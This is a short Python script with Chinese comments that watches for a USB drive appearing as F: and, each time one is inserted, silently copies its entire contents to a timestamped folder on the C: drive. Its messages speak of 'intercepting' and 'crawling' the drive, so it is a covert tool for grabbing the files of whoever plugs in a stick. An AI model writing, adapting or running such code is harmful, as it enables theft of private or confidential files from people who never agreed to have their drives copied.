import os
import datetime
import shutil

def main():
    now = datetime.datetime.now()
    # 用时间命名文件
    year = str(now.year)
    month = str(now.month)
    day = str(now.day)
    hour = str(now.hour)
    minute = str(now.minute)
    second = str(now.second)

    time = year + '_' + month + '_' + day + '_' + hour + '_' + minute + '_' + second

    locals = "C:\\" + time

    shutil.copytree('F:/', locals)
    # 前面是源文件，后面是你想要的复制到的目录
    print("————————爬取完成————————")


sign = True # 程序开关
while True:
    pan = os.path.exists("F:") # 验证u盘状态，False：未存在 Ture：存在

    if pan == True and sign == True:
        print('U盘运行中,准备截留')
        sign = False
        # 为避免多次爬取，在爬取前将开关关闭，等到下一次循环至此if语句是选择跳过
        main() # 执行
    if pan == False:
        print('未识别到U盘')
        sign = True
        # 开关打开，为新识别出的u盘做爬取准备

